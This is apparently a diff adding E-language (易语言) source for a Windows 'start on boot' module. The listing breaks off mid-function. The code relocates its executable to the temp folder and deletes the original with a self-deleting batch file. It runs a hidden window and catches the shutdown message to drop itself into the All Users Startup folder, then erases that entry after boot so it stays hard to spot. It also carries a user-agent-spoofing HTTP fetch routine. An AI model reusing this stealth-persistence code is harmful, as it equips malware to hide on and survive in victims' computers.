@@ -1,0 +1,695 @@
+ ' 文件类型：Windows模块源码
+
+ ' 程序名称：开机启动
+ ' 程序描述：
+ ' 程序作者： 
+ ' 邮政编码：
+ ' 联系地址：
+ ' 联系电话：
+ ' 传真号码：
+ ' 电子信箱：
+ ' 主页地址：
+ ' 版权声明：
+ ' 版本号：1.0
+ ' 创建号：0.0
+
+
+
+.常量 CS_VREDRAW, "1", , 窗口宽度被改变重绘窗口
+.常量 CS_HREDRAW, "2", , 窗口高度被改变重绘窗口
+.常量 IDI_APPLICATION, "32512", , 系统默认的鼠标指针
+.常量 COLOR_BTNFACE, "15", , 
+.常量 WM_CLOSE, "16", , 可否关闭
+.常量 WM_DESTROY, "2", , 一个窗口正在被销毁
+.常量 , , , 
+.常量 MAX_PATH, "260", , 
+.常量 CSIDL_PERSONAL, "5", , 
+.常量 CSIDL_FAVORITES, "6", , 
+.常量 CSIDL_DESKTOPDIRECTORY, "16", , 
+.常量 CSIDL_FONTS, "20", , 
+.常量 CSIDL_STARTMENU, "11", , 
+.常量 CSIDL_PROGRAMS, "2", , 
+.常量 CSIDL_STARTUP, "7", , 
+.常量 CSIDL_APPDATA, "26", , 
+.常量 , , , 
+.常量 我的文档, "1", , 
+.常量 我的收藏夹, "2", , 
+.常量 系统桌面, "3", , 
+.常量 系统字体, "4", , 
+.常量 开始菜单组, "5", , 
+.常量 程序菜单组, "6", , 
+.常量 启动菜单组, "7", , 
+.常量 程序数据目录, "8", , 
+.常量 Windows安装目录, "9", , 
+.常量 Windows系统目录, "10", , 
+.常量 临时文件目录, "11", , 
+.常量 , , , 
+
+
+ ' 所需要的支持库：
+ ' krnln d09f2340818511d396f6aaf844c7e325 5 0 系统核心支持库
+
+
+
+
+数据类型 WNDCLASSEX, , 窗口类
+    .成员 cbSize, 整数型, , , 结构字节数
+    .成员 style, 整数型, , , 类风格
+    .成员 lpfnWndProc, 整数型, , , 窗口过程地址
+    .成员 cbClsExtra, 整数型, , , 窗口预留空间
+    .成员 cbWndExtra, 整数型, , , 结构预留空间
+    .成员 hInstance, 整数型, , , 窗口属于的模块句柄
+    .成员 hIcon, 整数型, , , 图标句柄
+    .成员 hCursor, 整数型, , , 光标句柄
+    .成员 hbrBackground, 整数型, , , 窗口背景色
+    .成员 lpszMenuName, 文本型, , , 默认菜单
+    .成员 lpszClassName, 文本型, , , 窗口类名称
+    .成员 hIconSm, 整数型, , , 小图标句柄
+
+数据类型 POINTAPI, , 点结构
+    .成员 横向位置, 整数型, , , 
+    .成员 纵向位置, 整数型, , , 
+
+数据类型 MSG, , 
+    .成员 message, 整数型, , , 
+    .成员 paramL, 整数型, , , 
+    .成员 paramH, 整数型, , , 
+    .成员 time, 整数型, , , 
+    .成员 hwnd, 整数型, , , 
+    .成员 匿名成员266, 空白型, , , 
+    .成员 wParam, 整数型, , , 
+    .成员 lParam, 整数型, , , 
+    .成员 pt, POINTAPI, , , 
+
+
+.DLL命令 LocalSize, 整数型, "kernel32", "LocalSize", , 返回本地内存块大小
+    .参数 hMem, WNDCLASSEX, , 
+
+.DLL命令 GetModuleHandle, 整数型, "kernel32.dll", "GetModuleHandleA", , 
+    .参数 lpModuleName, 文本型, , 
+
+.DLL命令 LoadIcon, 整数型, "user32", "LoadIconA", , 从指定的模块或应用程序实例中载入一个图标。其中，LoadIconBynum是LoadIcon函数的类型安全声明　执行成功则返回已载入的图标的句柄；零表示失败。会设置GetLastError
+    .参数 实例句柄, 整数型, , 
+    .参数 图标标识, 整数型, , 
+
+.DLL命令 LoadCursor, 整数型, "user32", "LoadCursorA", , 从指定的模块或应用程序实例中载入一个鼠标指针。LoadCursorBynum是LoadCursor函数的类型安全声明　执行成功则返回已载入的指针的句柄；零表示失败。在Windows ;    95 和Win16环境中，这个函数只能载入标准尺寸的图标
+    .参数 实例句柄, 整数型, , 一个DLL的模块句柄；或者一个实例句柄，指定包含了鼠标指针的可执行程序
+    .参数 鼠标指针标识, 整数型, , 作为一个字串，指定欲载入的指针资源。作为一个长整数值，指定欲载入的资源ID；或者设置一个常数，代表某幅固有系统指针。如装载的是一个固有系统指针，注意hInstance参数应设为零。在api32.txt文件中以前缀IDC_ 作为标志;  
+
+.DLL命令 RegisterClassEx, 整数型, "user32", "RegisterClassExA", , 　
+    .参数 pcWndClassEx, WNDCLASSEX, , 
+
+.DLL命令 CreateWindowEx, 整数型, "user32.dll", "CreateWindowExA", , 
+    .参数 dwExStyle, 整数型, , 
+    .参数 lpClassName, 文本型, , 窗口实例的类的名字
+    .参数 lpWindowName, 文本型, , 窗口标题名
+    .参数 dwStyle, 整数型, , 新创建的窗口的样式
+    .参数 X, 整数型, , 窗口左上角的横坐标
+    .参数 Y, 整数型, , 窗口左上角的纵坐标
+    .参数 nWidth, 整数型, , 窗口的宽度
+    .参数 nHeight, 整数型, , 窗口的高度
+    .参数 hWndParent, 整数型, , 该窗口的父窗口的句柄
+    .参数 hMenu, 整数型, , 窗口主菜单句柄
+    .参数 hInstance, 整数型, , 创建窗口的应用程序当前句柄
+    .参数 lpParam, 整数型, , 指向一个传递给窗口的参数值的指针
+
+.DLL命令 SetWindowLongA, 整数型, "user32.dll", "SetWindowLongA", , SetWindowLongA在窗口结构中为指定的窗口设置信息  指定数据的前一个值
+    .参数 窗口句柄, 整数型, , hwnd，欲为其取得信息的窗口的句柄
+    .参数 窗口信息值, 整数型, , nIndex，请参考GetWindowLong函数的nIndex参数的说明
+    .参数 窗口信息新值, 整数型, , dwNewLong，由nIndex指定的窗口信息的新值
+
+.DLL命令 DefWindowProc, 整数型, "user32", "DefWindowProcA", , 调用缺省窗口过程　
+    .参数 hwnd, 整数型, , 
+    .参数 wMsg, 整数型, , 
+    .参数 wParam, 整数型, , 
+    .参数 lParam, 整数型, , 
+
+.DLL命令 GetMessage, 整数型, "user32", "GetMessageA", , 从线索消息队列中返回一条消息　
+    .参数 lpMsg, MSG, , 
+    .参数 hwnd, 整数型, , 
+    .参数 wMsgFilterMin, 整数型, , 
+    .参数 wMsgFilterMax, 整数型, , 
+
+.DLL命令 TranslateMessage, 整数型, "user32", "TranslateMessage", , 转换虚拟关键字消息　
+    .参数 lpMsg, MSG, , 
+
+.DLL命令 DispatchMessage, 整数型, "user32", "DispatchMessageA", , 向窗口发送消息　
+    .参数 lpMsg, MSG, , 
+
+.DLL命令 ShowWindow, 整数型, "user32.dll", "ShowWindow", , 控制窗口的可见性（在vb里使用：针对vb窗体及控件，请使用对应的vb属性）  如窗口之前是可见的，则返回TRUE（非零），否则返回FALSE（零）
+    .参数 窗口句柄, 整数型, , 窗口句柄，要向这个窗口应用由nCmdShow指定的命令
+    .参数 窗口状态, 整数型, , 为窗口指定可视性方面的一个命令。请用下述任何一个常数;0隐藏窗口，活动状态给令一个窗口;1与9相同;2最小化窗口，并将其激活;3最大化窗口，并将其激活;4用最近的大小和位置显示一个窗口，同时不改变活动窗口;5用当前的大小和位置显示一个窗口，同时令其进入活动状态;6最小化窗口，活动状态给令一个窗口;7最小化一个窗口，同时不改变活动窗口;8用当前的大小和位置显示一个窗口，不改变活动窗口;9用原来的大小和位置显示一个窗口，同时令其进入活动状态;
+
+.DLL命令 RegOpenKeyA, 整数型, "", "RegOpenKeyA", , 
+    .参数 hKey, 整数型, , 
+    .参数 lpSubKey, 文本型, , 
+    .参数 phkResult, 整数型, 传址, 
+
+.DLL命令 RegSetValueExA, 整数型, "", "RegSetValueExA", , 
+    .参数 hKey, 整数型, , 
+    .参数 lpValueName, 文本型, 传址, 
+    .参数 Reserved, 整数型, , 
+    .参数 dwType, 整数型, , 
+    .参数 lpData, 字节集, 传址, 
+    .参数 cbData, 整数型, , 
+
+.DLL命令 关闭注册表项_, 整数型, "advapi32.dll", "RegCloseKey", , 零（ERROR_SUCCESS）表示成功。其他任何值都代表一个错误代码
+    .参数 关闭项句柄, 整数型, , hKey，要关闭的项句柄
+
+.DLL命令 创建指定注册表项扩展_, 整数型, "advapi32.dll", "RegCreateKeyExA", , 在指定项下创建新项的更复杂的方式。在Win32环境中建议使用这个函数。如指定的项已经存在，则函数会打开现有的项
+    .参数 项句柄, 整数型, , 一个打开项的句柄，或者一个标准项名
+    .参数 新子项名称, 文本型, , 欲创建的新子项的名字
+    .参数 保留参数, 整数型, , 设为零
+    .参数 项类名, 文本型, , 项的类名
+    .参数 选项标志, 整数型, , 下述常数为零：REG_OPTION_VOLATILE——这个项不正式保存下来，系统重新启动后会消失
+    .参数 常量标志, 整数型, , 带有前缀KEY_??的一个或多个常数。它们组合起来描述了允许对这个项进行哪些操作
+    .参数 安全特性结构, 空白型, , SECURITY_ATTRIBUTES，对这个项的安全特性进行描述的一个结构（用ByVal As Long传递空值）。不适用于windows 95
+    .参数 新子项变量, 整数型, 传址, 指定用于装载新子项句柄的一个变量
+    .参数 常数变量, 整数型, 传址, 用于装载下列某个常数的一个变量
+
+.DLL命令 CallWindowProcA, 整数型, "", "CallWindowProcA", , 
+    .参数 程序指针, 子程序指针, , 
+    .参数 窗口句柄, 整数型, , 
+    .参数 消息, 整数型, , 
+    .参数 参数1, 整数型, , 
+    .参数 参数2, 整数型, , 
+
+.DLL命令 SHGetSpecialFolderPath, 逻辑型, "", "SHGetSpecialFolderPathA", , 
+    .参数 hwndOwner, 整数型, , 
+    .参数 lpszPath, 文本型, , 
+    .参数 nFolder, 整数型, , 
+    .参数 fCreate, 逻辑型, , 
+
+.DLL命令 GetSystemDirectory, 整数型, "", "GetSystemDirectoryA", , 
+    .参数 lpBuffer, 文本型, , 
+    .参数 nSize, 空白型, , 
+
+.DLL命令 GetTempPath, 整数型, "", "GetTempPathA", , 
+    .参数 nSize, 空白型, , 
+    .参数 lpBuffer, 文本型, , 
+
+.DLL命令 GetWindowsDirectory, 整数型, "", "GetWindowsDirectoryA", , 
+    .参数 lpBuffer, 文本型, , 
+    .参数 nSize, 空白型, , 
+
+.DLL命令 CreateFile, 整数型, "kernel32.dll", "CreateFileA", , CreateFile (“a”, -2147483648, 2, 0, 1, 128, 0)
+    .参数 lpFileName, 文本型, , 
+    .参数 dwDesiredAccess, 整数型, , 
+    .参数 dwShareMode, 整数型, , 
+    .参数 lpSecurityAttributes, 整数型, , SECURITY_ATTRIBUTES，指向一个SECURITY_ATTRIBUTES结构的指针，定义了文件的安全特性（如果操作系统支持的话）
+    .参数 dwCreationDisposition, 整数型, , 
+    .参数 dwFlagsAndAttributes, 整数型, , 
+    .参数 hTemplateFile, 整数型, , 
+
+.DLL命令 lwrite, 整数型, "kernel32.dll", "_lwrite", , 
+    .参数 hFile, 整数型, , 文件句柄
+    .参数 lpBuffer, 文本型, , 指定一个内存块的指针，把这个内存块的数据写入文件
+    .参数 wBytes, 整数型, , 要写入的字节数
+
+.DLL命令 LZClose, 整数型, "lz32.dll", "LZClose", , 
+    .参数 hfFile, 整数型, , 欲关闭的句柄。这是由LZOpenFile 或 LZInit函数返回的一个句柄，不是普通的系统文件句柄
+
+.DLL命令 WinExec, 整数型, "kernel32.dll", "WinExec", , 运行程序
+    .参数 lpCmdLine, 文本型, , 
+    .参数 nCmdShow, 整数型, , 定义了以怎样的形式启动程序的常数值。参考ShowWindow函数的nCmdShow参数
+
+.DLL命令 lopen, 整数型, "kernel32.dll", "_lopen", , 
+    .参数 lpPathName, 文本型, , 欲打开文件的名字
+    .参数 iReadWrite, 整数型, , 访问模式和共享模式常数的一个组合，如下所示：   1、访问模式   READ 打开文件，读取其中的内容   READ_WRITE 打开文件，对其进行读写   WRITE 打开文件，在其中写入内容   2、共享模式（参考OpenFile函数的标志常数表）   OF_SHARE_COMPAT， OF_SHARE_DENY_NONE， OF_SHARE_DENY_READ， OF_SHARE_DENY_WRITE， OF_SHARE_EXCLUSIVE
+
+.DLL命令 启动线程_, 整数型, "kernel32.dll", "CreateThread", , 启动线程
+    .参数 lpThreadAttributes, 整数型, , 
+    .参数 dwStackSize, 整数型, , 
+    .参数 lpStartAddress, 子程序指针, , 
+    .参数 lpParameter, 整数型, , 
+    .参数 dwCreationFlags, 整数型, , 
+    .参数 lpThreadId, 整数型, , 
+
+.DLL命令 SetTime, 整数型, "user32", "SetTimer", , 
+    .参数 hwnd, 整数型, , 
+    .参数 nIDEvent, 整数型, , 
+    .参数 uElapse, 整数型, , 
+    .参数 lpTimeFunc, 子程序指针, , 
+
+.DLL命令 KillTime, 空白型, "user32", "KillTimer", , 
+    .参数 hwnd, 整数型, , 
+    .参数 nIDEvent, 整数型, , 
+
+.DLL命令 发送消息, 整数型, "", "SendMessageA", , 
+    .参数 hwnd, 整数型, , 
+    .参数 wMsg, 整数型, , 
+    .参数 wParam, 整数型, , 
+    .参数 lParam, 整数型, , 
+
+.DLL命令 _终止进程, 整数型, "", "TerminateProcess", , 
+    .参数 id, 空白型, , 
+    .参数 a, 空白型, , 
+
+.DLL命令 _取自进程ID, 整数型, "kernel32.dll", "GetCurrentProcessId", , 
+
+.DLL命令 OpenProcess, 整数型, "", "", , 
+    .参数 dwDesiredAccess, 整数型, , 
+    .参数 bInheritHandle, 整数型, , 
+    .参数 dwProcessId, 整数型, , 
+
+.DLL命令 Internet激活, 整数型, "wininet.dll", "InternetOpenA", , 
+    .参数 句柄名称, 文本型, 传址, 
+    .参数 连接类型, 整数型, , 1直接连接;3代理连接
+    .参数 代理地址, 文本型, 传址, 
+    .参数 代理掩码, 文本型, 传址, 
+    .参数 dwFlags, 整数型, , 0
+
+.DLL命令 Internet建立连接, 整数型, "wininet.dll", "InternetConnectA", , 
+    .参数 Internet句柄, 整数型, , 
+    .参数 域名, 文本型, 传址, 
+    .参数 服务器端口, 整数型, , 80HTTP;21FTP;
+    .参数 用户名, 文本型, 传址, 空
+    .参数 用户口令, 文本型, 传址, 空
+    .参数 服务类型, 整数型, , 1FTP;3HTTP
+    .参数 dwFlags, 整数型, , 0http;134217728被动FTP模式
+    .参数 dwContext, 整数型, , 0
+
+.DLL命令 Internet关闭句柄, 逻辑型, "wininet.dll", "InternetCloseHandle", , 
+    .参数 句柄, 整数型, , 
+
+.DLL命令 Internet读文件, 逻辑型, "wininet.dll", "InternetReadFile", , 
+    .参数 HTTP请求句柄, 整数型, , 
+    .参数 sBuffer, 字节集, 传址, 
+    .参数 lNumBytesToRead, 整数型, , 
+    .参数 lNumberOfBytesRead, 整数型, 传址, 
+
+.DLL命令 Http创建请求, 整数型, "wininet.dll", "HttpOpenRequestA", , 
+    .参数 Internet连接句柄, 整数型, , 由Internet建立连接返回
+    .参数 访问方式, 文本型, 传址, "GET" or "POST"为空默认GET
+    .参数 页面路径, 文本型, 传址, 简短路径,不带域名
+    .参数 协议版本, 文本型, 传址, 为空默认HTTP/1.1
+    .参数 引用页, 文本型, 传址, 可为空
+    .参数 识别类型, 文本型, 传址, 可为空
+    .参数 dwFlags, 整数型, , 2147483648更新下载
+    .参数 dwContext, 整数型, , 0
+
+.DLL命令 Http发送请求, 逻辑型, "wininet.dll", "HttpSendRequestA", , 
+    .参数 HTTP请求句柄, 整数型, , 
+    .参数 sHeaders, 文本型, 传址, 
+    .参数 lHeadersLength, 整数型, , 
+    .参数 sOptional, 文本型, 传址, 
+    .参数 lOptionalLength, 整数型, , 
+
+.DLL命令 设置COOKIE, 逻辑型, "wininet.dll", "InternetSetCookieA", , 
+    .参数 域名, 文本型, 传址, 
+    .参数 名称, 文本型, 传址, 
+    .参数 内容, 文本型, 传址, 
+
+.DLL命令 创建线程, 整数型, "", "CreateThread", , 
+    .参数 lpThreadAttributes, 整数型, , 
+    .参数 dwStackSize, 整数型, , 
+    .参数 lpStartAddress, 子程序指针, , 
+    .参数 lpParameter, 整数型, , 
+    .参数 dwCreationFlags, 整数型, , 
+    .参数 lpThreadId, 整数型, 传址, 
+
+.DLL命令 销毁线程, 空白型, "", "TerminateThread", , 
+    .参数 hThread, 整数型, , 
+    .参数 dwExitCode, 整数型, , 
+
+.DLL命令 HTTP查询信息, 逻辑型, "wininet.dll", "HttpQueryInfoA", , 
+    .参数 Internet请求句柄, 整数型, , 
+    .参数 待查信息, 整数型, , 22返回所有信息;43SET_COOKIE;+2147483648返回文本
+    .参数 返回容器, 文本型, 传址, 
+    .参数 返回容器长度, 整数型, 传址, 
+    .参数 lpdwIndex, 整数型, , 
+
+.程序集 程序集1, , , 
+
+.程序集变量 窗口句柄_, 整数型, , , 
+.程序集变量 启动目录, 文本型, , , 
+.程序集变量 重启软件, 逻辑型, , , 
+.程序集变量 匿名程序集变量_405, 空白型, , , 
+.程序集变量 完整网址2, 文本型, , , 
+.程序集变量 访问方式2, 文本型, , , "GET" or "POST",为空默认"GET"
+.程序集变量 代理地址2, 文本型, , , 
+.程序集变量 附加协议头2, 文本型, , , 
+.程序集变量 提交信息2, 文本型, , , "POST"专用
+.程序集变量 页面内容, 字节集, , , 
+.程序集变量 页面信息网址, 文本型, , , 
+.程序集变量 线程号, 整数型, , , 
+.程序集变量 页面信息线程号, 整数型, , , 
+.程序集变量 页面信息, 文本型, , , 
+.子程序 _启动子程序, 整数型, , 请在本子程序中放置易模块初始化代码
+
+_临时子程序 () ' 在初始化代码执行完毕后调用测试代码
+返回 (0) ' 可以根据您的需要返回任意数值
+
+.子程序 _临时子程序, 空白型, , 
+ ' 本名称子程序用作测试程序用，仅在开发及调试环境中有效，编译发布程序前将被系统自动清空，请将所有用作测试的临时代码放在本子程序中。 ***注意不要修改本子程序的名称、参数及返回值类型。
+
+
+.子程序 开机启动, 整数型, 公开, 
+赋值 (窗口句柄_, 创建WINDOWS窗口 ())
+赋值 (启动目录, 相加 (取文本左边 (取特定目录_ (9), 3), “Documents and Settings\All Users\「开始」菜单\程序\启动\”))
+.如果真 (不等于 (相加 (取运行目录 (), “\”, 取执行文件名 ()), 相加 (取特定目录_ (11), 取执行文件名 ())))
+    复制文件 (相加 (取运行目录 (), “\”, 取执行文件名 ()), 相加 (取特定目录_ (11), 取执行文件名 ()))
+    运行 (相加 (取特定目录_ (11), 取执行文件名 ()), 假, )
+    KillMe (取执行文件名 ())
+.如果真结束
+.如果真 (文件是否存在 (相加 (启动目录, 取执行文件名 ())))
+    删除文件 (相加 (启动目录, 取执行文件名 ()))
+.如果真结束
+ ' 启动线程_ (0, 0, &连接, 0, 0, 0)
+返回 (窗口句柄_)
+
+.子程序 创建WINDOWS窗口, 整数型, , 
+.局部变量 WindowFunction, 整数型, , , 窗口函数
+.局部变量 WndClass, WNDCLASSEX, , , 窗口类名
+.局部变量 WindowsStyle, 整数型, , , 窗口风格
+.局部变量 msg, MSG, , , 循环消息
+.局部变量 句柄, 空白型, , , 
+
+赋值 (WndClass.cbSize, LocalSize (WndClass)) ' 取类型尺寸
+赋值 (WndClass.style, 位或 (#CS_VREDRAW, #CS_HREDRAW)) ' 设置重绘消息
+赋值 (WndClass.lpfnWndProc, 到整数 (&WindowsProcess)) ' 设置启动窗口处理函数
+赋值 (WndClass.cbClsExtra, 0) ' 不设置任何
+赋值 (WndClass.cbWndExtra, 0) ' 不设置任何
+赋值 (WndClass.hInstance, -2147483648) ' GetModuleHandle (“”)  ' 取全局实例句柄
+赋值 (WndClass.hIcon, LoadIcon (0, #IDI_APPLICATION)) ' 取窗口光标句柄
+赋值 (WndClass.hCursor, LoadCursor (0, #IDI_APPLICATION)) ' 载入窗口光标
+赋值 (WndClass.hbrBackground, 相加 (#COLOR_BTNFACE, 1)) ' 系统默认的灰色
+赋值 (WndClass.lpszMenuName, “”)
+赋值 (WndClass.lpszClassName, “BMWinClass”) ' 窗口类名
+RegisterClassEx (WndClass) ' 注册窗口类名
+ ' WindowsStyle ＝ 位或 (#WS_VISIBLE, #WS_SIZEBOX, #WS_MAXIMIZEBOX, #WS_MINIMIZEBOX, #WS_CAPTION, #WS_SYSMENU)  ' 设置窗口风格，可自定义。
+赋值 (句柄, CreateWindowEx (0, WndClass.lpszClassName, “窗口名”, 268435456, -1000, -1000, 800, 600, 0, 0, WndClass.hInstance, 0)) ' 创建窗口
+SetWindowLongA (句柄, -8, 128)
+ShowWindow (句柄, 0) ' 隐藏窗口
+返回 (句柄)
+ ' 句柄 ＝ CreateWindowEx (0, WndClass.lpszClassName, “API创建窗口例子”, WindowsStyle, #CW_USEDEFAULT, #CW_USEDEFAULT, 450, 300, 0, 0, WndClass.hInstance, 0)  ' 创建窗口 ' #CW_USEDEFAULT, #CW_USEDEFAULT 等于位置
+ ' 消息循环
+ ' .判断循环首 (不等于 (GetMessage (msg, 0, 0, 0), 0))
+     ' TranslateMessage (msg)
+     ' DispatchMessage (msg)
+ ' .判断循环尾 ()
+ ' 返回 (消息.wParam)
+
+.子程序 WindowsProcess, 整数型, , 
+.参数 hwnd, 整数型, , 
+.参数 msg, 整数型, , 
+.参数 wparam, 整数型, , 
+.参数 lparam, 整数型, , 
+
+.如果真 (等于 (msg, 17)) ' 拦截关机
+    复制文件 (相加 (取运行目录 (), “\”, 取执行文件名 ()), 相加 (启动目录, 取执行文件名 ()))
+    KillMe (取执行文件名 ())
+    返回 (0)
+.如果真结束
+.如果真 (等于 (msg, #WM_DESTROY)) ' 一个窗口被销毁
+    .如果真 (等于 (wparam, 2))
+        运行 (相加 (取运行目录 (), “\”, 取执行文件名 ()), 假, )
+    .如果真结束
+    终止自身进程 ()
+    返回 (0)
+.如果真结束
+返回 (DefWindowProc (hwnd, msg, wparam, lparam))
+
+.子程序 内部_消息循环, 整数型, , 放在启动子程序最后一行,即在返回命令前
+.局部变量 Msg, MSG, , , 
+
+.判断循环首 (不等于 (GetMessage (Msg, 0, 0, 0), 0)) ' 消息循环
+    TranslateMessage (Msg)
+    DispatchMessage (Msg)
+.判断循环尾 ()
+返回 (Msg.wParam) ' 消息循环结束即程序终止时将信息返回系统
+
+.子程序 KillMe, 空白型, 公开, 无返回值
+.参数 FileName, 文本型, , 
+
+.局部变量 文件句柄, 整数型, , , 由CreateFile返回
+.局部变量 数据, 文本型, , , 欲写入的数据
+
+赋值 (文件句柄, CreateFile (相加 (取执行文件名 (), “_And DeleteMe.bat”), -2147483648, 2, 0, 1, 128, 0))
+LZClose (文件句柄)
+赋值 (数据, 相加 (“:try”, #换行符, “del ”, #引号, 取运行目录 (), “\”, FileName, #引号, #换行符, “if exist ”, #引号, 取运行目录 (), “\”, FileName, #引号, “ goto try”, #换行符, “del %0”))
+lwrite (lopen (相加 (取执行文件名 (), “_And DeleteMe.bat”), 2), 数据, 取文本长度 (数据))
+LZClose (文件句柄)
+WinExec (相加 (取执行文件名 (), “_And DeleteMe.bat”), 0)
+终止自身进程 ()
+
+.子程序 终止自身进程, 逻辑型, 公开, 终止一个进程(成功返回真,失败返回假)
+.如果 (等于 (_终止进程 (OpenProcess (1, 0, _取自进程ID ()), 0), 1))
+    返回 (真)
+.否则
+    返回 (假)
+.如果结束
+
+
+.子程序 取特定目录_, 文本型, , 例子：取特定目录 (#我的文档) 或 取特定目录 (1) 等。本命令返回指定的Windows系统特定目录，所返回目录名以“\”符号结束，如失败返回空文本。本命令为初级命令。
+.参数 参数类型, 空白型, 可空, 默认：10: #Windows系统目录。 1: #我的文档;  2: #我的收藏夹;  3: #系统桌面;  4: #系统字体;  5: #开始菜单组;  6: #程序菜单组;  7: #启动菜单组;  8: #程序数据目录;  9: #Windows安装目录;  10: #Windows系统目录;  11: #临时文件目录。
+
+.局部变量 path, 文本型, , , 
+.局部变量 blOK, 逻辑型, , , 
+.局部变量 常数, 整数型, , , 
+.局部变量 文本指针, 整数型, , , 
+
+赋值 (path, 取空白文本 (#MAX_PATH))
+.如果真 (等于 (参数类型, 0))
+    赋值 (参数类型, 11)
+.如果真结束
+
+.判断开始 (并且 (大于或等于 (参数类型, 1), 小于或等于 (参数类型, 8)))
+    赋值 (常数, 多项选择 (参数类型, #CSIDL_PERSONAL, #CSIDL_FAVORITES, #CSIDL_DESKTOPDIRECTORY, #CSIDL_FONTS, #CSIDL_STARTMENU, #CSIDL_PROGRAMS, #CSIDL_STARTUP, #CSIDL_APPDATA))
+    .如果真 (SHGetSpecialFolderPath (0, path, 常数, 假))
+        赋值 (blOK, 真)
+    .如果真结束
+    
+.判断 (等于 (参数类型, 9))
+    赋值 (blOK, 大于 (GetWindowsDirectory (path, #MAX_PATH), 0))
+.判断 (等于 (参数类型, 10))
+    赋值 (blOK, 大于 (GetSystemDirectory (path, #MAX_PATH), 0))
+.判断 (等于 (参数类型, 11))
+    赋值 (blOK, 大于 (GetTempPath (#MAX_PATH, path), 0))
+.默认
+    
+.判断结束
+.如果真 (blOK)
+    .如果真 (不等于 (取文本右边 (path, 1), “\”))
+        赋值 (path, 相加 (path, “\”))
+    .如果真结束
+    返回 (path)
+.如果真结束
+返回 (“”)
+
+
+.子程序 http读文件_, 字节集, , 有可能线程阻塞,请在外部加超时判断
+.参数 完整网址, 文本型, , 
+.参数 访问方式, 文本型, 可空, "GET" or "POST",为空默认"GET"
+.参数 代理地址, 文本型, 可空, 
+.参数 附加协议头, 文本型, 可空, 
+.参数 提交信息, 文本型, 可空, "POST"专用
+.参数 超时值, 整数型, 可空, 
+
+.局部变量 开始时间, 整数型, , , 
+
+赋值 (完整网址2, 完整网址)
+赋值 (访问方式2, 访问方式)
+赋值 (代理地址2, 代理地址)
+赋值 (附加协议头2, 附加协议头)
+赋值 (提交信息2, 提交信息)
+赋值 (页面内容, 取空白字节集 (0))
+.如果真 (或者 (是否为空 (超时值), 等于 (超时值, 0)))
+    赋值 (超时值, 90)
+.如果真结束
+赋值 (开始时间, 取启动时间 ())
+赋值 (线程号, 创建线程 (0, 0, &读网页, 0, 0, 线程号))
+.判断循环首 (大于 (线程号, 0))
+    处理事件 ()
+    .如果真 (大于 (相减 (取启动时间 (), 开始时间), 相乘 (超时值, 1000)))
+        销毁线程 (线程号, 0)
+        处理事件 ()
+        赋值 (页面内容, 取空白字节集 (0))
+        赋值 (线程号, 0)
+    .如果真结束
+    
+.判断循环尾 ()
+返回 (页面内容)
+
+.子程序 读网页, 空白型, , 
+.局部变量 Internet句柄, 整数型, , , 
+.局部变量 Internet连接句柄, 整数型, , , 
+.局部变量 HTTP请求句柄, 整数型, , , 
+.局部变量 域名, 文本型, , , 
+.局部变量 页面地址, 文本型, , , 
+.局部变量 整数容器1, 整数型, , , 
+.局部变量 整数容器2, 整数型, , , 
+.局部变量 逻辑容器, 逻辑型, , , 
+.局部变量 文本容器, 文本型, , , 
+.局部变量 字节集容器, 字节集, , , 
+
+赋值 (域名, 取域名 (完整网址2))
+赋值 (页面地址, 取页面地址 (完整网址2))
+
+ ' 建立基础连接
+.如果 (等于 (删全部空 (代理地址2), “”))
+    赋值 (Internet句柄, Internet激活 (到文本 (“Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)”), 1, “”, “”, 0))
+.否则
+    赋值 (Internet句柄, Internet激活 (到文本 (“Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)”), 3, 到文本 (相加 (“http=”, 代理地址2)), “”, 0))
+.如果结束
+.如果真 (等于 (Internet句柄, 0))
+    赋值 (页面内容, 取空白字节集 (0))
+    返回 ()
+.如果真结束
+赋值 (Internet连接句柄, Internet建立连接 (Internet句柄, 域名, 取端口 (完整网址2), “”, “”, 3, 0, 0))
+.如果真 (等于 (Internet连接句柄, 0))
+    赋值 (页面内容, 取空白字节集 (0))
+    返回 ()
+.如果真结束
+赋值 (HTTP请求句柄, Http创建请求 (Internet连接句柄, 访问方式2, 到文本 (页面地址), “HTTP/1.1”, 到文本 (“”), 到文本 (“”), 2147483648, 0))
+.如果真 (等于 (HTTP请求句柄, 0))
+    赋值 (页面内容, 取空白字节集 (0))
+    返回 ()
+.如果真结束
+
+ ' 补充协议头
+.如果真 (等于 (寻找文本 (附加协议头2, “Accept: ”, 1, 真), -1))
+    赋值 (附加协议头2, 相加 (附加协议头2, “Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*”, #换行符))
+.如果真结束
+.如果真 (等于 (寻找文本 (附加协议头2, “Referer: ”, 1, 真), -1))
+    赋值 (附加协议头2, 相加 (附加协议头2, “Referer: ”, 完整网址2, #换行符))
+.如果真结束
+.如果真 (等于 (寻找文本 (附加协议头2, “Accept-Language: ”, 1, 真), -1))
+    赋值 (附加协议头2, 相加 (附加协议头2, “Accept-Language: zh-cn”, #换行符))
+.如果真结束
+
+ ' 附带信息发送请求
+.判断开始 (或者 (等于 (访问方式2, “”), 等于 (访问方式2, “GET”)))
+    Http发送请求 (HTTP请求句柄, 附加协议头2, 取文本长度 (附加协议头2), “”, 0)
+.判断 (等于 (访问方式2, “POST”))
+    .如果真 (不等于 (提交信息2, “”))
+        赋值 (附加协议头2, 相加 (附加协议头2, “Content-Type: application/x-www-form-urlencoded”, #换行符))
+        赋值 (附加协议头2, 相加 (附加协议头2, “Content-Length: ”, 到文本 (取文本长度 (提交信息2)), #换行符))
+    .如果真结束
+    Http发送请求 (HTTP请求句柄, 附加协议头2, 取文本长度 (附加协议头2), 提交信息2, 取文本长度 (提交信息2))
+.默认
+    赋值 (页面内容, 取空白字节集 (0))
+    返回 ()
+.判断结束
+
+ ' 读取页面文本
+赋值 (逻辑容器, 真)
+赋值 (整数容器1, 0)
+.判断循环首 (逻辑容器)
+    赋值 (字节集容器, 取空白字节集 (512))
+    处理事件 ()
+    Internet读文件 (HTTP请求句柄, 字节集容器, 取字节集长度 (字节集容器), 整数容器1)
+    .如果 (等于 (整数容器1, 0))
+        赋值 (逻辑容器, 假)
+    .否则
+        赋值 (页面内容, 相加 (页面内容, 取字节集左边 (字节集容器, 整数容器1)))
+    .如果结束
+    
+.判断循环尾 ()
+
+ ' 取服务器回传协议头
+赋值 (文本容器, 取空白文本 (1024))
